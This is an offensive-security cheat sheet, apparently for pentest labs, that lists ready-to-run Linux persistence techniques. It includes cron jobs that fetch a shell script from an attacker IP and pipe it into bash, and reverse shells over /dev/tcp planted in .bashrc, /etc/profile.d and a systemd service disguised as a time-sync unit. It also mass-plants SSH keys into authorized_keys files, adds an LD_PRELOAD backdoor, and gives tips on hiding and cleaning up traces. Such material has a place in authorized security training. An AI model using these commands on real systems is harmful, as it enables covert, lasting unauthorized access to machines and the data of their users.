# Linux Persistence — Cron, SSH Keys & Backdoors

---

## Method 1: Hidden Cron Job (/etc/cron.d/)

Writing to `/etc/cron.d/` requires root. Files in this directory are processed by cron directly.

```bash
# Create a cron job that runs every 5 minutes as root:
cat > /etc/cron.d/.update << 'EOF'
*/5 * * * * root curl -s http://192.168.45.202/shell.sh | bash
EOF
chmod 644 /etc/cron.d/.update

# Alternative — execute a payload from disk:
cat > /etc/cron.d/sysupdate << 'EOF'
@reboot root /tmp/.svc/agent &>/dev/null
*/10 * * * * root /tmp/.svc/agent &>/dev/null 2>&1
EOF

# Verify it was picked up by cron (check no syntax errors):
crontab -l
ls -la /etc/cron.d/
```

---

## Method 2: User Crontab (No Root Required)

```bash
# Add to current user's crontab:
(crontab -l 2>/dev/null; echo "*/5 * * * * curl -s http://192.168.45.202/shell.sh | bash") | crontab -

# Hidden callback — looks like maintenance:
(crontab -l 2>/dev/null; echo "@reboot nohup /tmp/.cache/svc >/dev/null 2>&1 &") | crontab -

# Check crontab:
crontab -l

# Edit another user's crontab (if root):
crontab -u username -e
```

---

## Method 3: SSH Authorized Keys (Persistent SSH Access)

```bash
# Generate key on Kali:
ssh-keygen -t ed25519 -f /tmp/backdoor_key -N ""
cat /tmp/backdoor_key.pub
# Copy the public key content

# Add to target user (if you have write access to their home):
mkdir -p /home/victim/.ssh
chmod 700 /home/victim/.ssh
echo "ssh-ed25519 AAAA... kali@attacker" >> /home/victim/.ssh/authorized_keys
chmod 600 /home/victim/.ssh/authorized_keys
chown victim:victim /home/victim/.ssh/authorized_keys

# Add to root (if root):
mkdir -p /root/.ssh
chmod 700 /root/.ssh
echo "ssh-ed25519 AAAA... kali@attacker" >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys

# Deploy to ALL users with .ssh directories:
for dir in /home/*/.ssh; do
    echo "ssh-ed25519 AAAA... kali@attacker" >> "$dir/authorized_keys"
    chmod 600 "$dir/authorized_keys"
done

# Connect back (with the private key):
ssh -i /tmp/backdoor_key victim@TARGET_IP
```

---

## Method 4: .bashrc / .profile Injection (User-Triggered)

Executes whenever the user opens a terminal or logs in interactively.

```bash
# Add reverse shell to user's .bashrc (non-root needed):
echo 'bash -i >& /dev/tcp/192.168.45.202/4444 0>&1 &' >> /home/victim/.bashrc

# More subtle — check if not already connected before running:
cat >> /home/victim/.bashrc << 'EOF'
if ! nc -z 192.168.45.202 4444 2>/dev/null; then
    nohup bash -i >& /dev/tcp/192.168.45.202/4444 0>&1 &
fi
EOF

# For all login shells (profile):
echo 'nohup /tmp/.svc/agent &>/dev/null &' >> /home/victim/.profile
```

---

## Method 5: /etc/profile.d/ Script (System-Wide, All Users)

```bash
# Requires root — executes for ALL users on login:
cat > /etc/profile.d/sysinit.sh << 'EOF'
#!/bin/bash
nohup bash -c 'bash -i >& /dev/tcp/192.168.45.202/4444 0>&1' &>/dev/null &
EOF
chmod +x /etc/profile.d/sysinit.sh
```

---

## Method 6: Systemd Service (Root — Survives Reboots)

```bash
# Create a malicious systemd service:
cat > /etc/systemd/system/system-network.service << 'EOF'
[Unit]
Description=Network Time Sync
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/192.168.45.202/4444 0>&1'
Restart=always
RestartSec=30

[Install]
WantedBy=multi-user.target
EOF

# Enable and start:
systemctl daemon-reload
systemctl enable system-network
systemctl start system-network

# Check status:
systemctl status system-network
```

---

## Method 7: LD_PRELOAD Library Backdoor

```bash
# Requires root — injects into processes that load shared libraries
# Create a malicious .so that spawns a reverse shell:
# (Compile from 08-linux/loaders/sharedLibrary_LD_PRELOAD.c)

# Add to /etc/ld.so.preload (injects into EVERY process):
echo "/tmp/evil.so" >> /etc/ld.so.preload
# WARNING: Will crash many processes if the .so has bugs — use carefully
```

---

## Cron Syntax Quick Reference

```
# Cron format: minute hour day month weekday command
# ┌──────────── minute (0-59)
# │ ┌────────── hour (0-23)
# │ │ ┌──────── day of month (1-31)
# │ │ │ ┌────── month (1-12)
# │ │ │ │ ┌──── day of week (0-7, 0 and 7 = Sunday)
# │ │ │ │ │
# * * * * * command

# Every minute:
* * * * *

# Every 5 minutes:
*/5 * * * *

# Every hour at :30:
30 * * * *

# Daily at 3am:
0 3 * * *

# On reboot:
@reboot

# Every 4 hours:
0 */4 * * *
```

---

## Cleanup / Detection Evasion

```bash
# Hide your cron file from standard listing (it won't show in ls if you know the trick):
# Store in /etc/cron.d/ with a name starting with dot:
ls /etc/cron.d/                 # regular listing shows it
ls -la /etc/cron.d/             # -la shows hidden files too

# Find hidden cron files:
find /etc/cron* /var/spool/cron -name ".*" 2>/dev/null

# Remove your persistence:
rm /etc/cron.d/.update
crontab -l | grep -v "192.168.45.202" | crontab -   # remove specific entry

# Check all cron locations:
crontab -l
ls /etc/cron.d/ /etc/cron.daily/ /etc/cron.hourly/ /etc/cron.weekly/ /etc/cron.monthly/
cat /etc/crontab
```
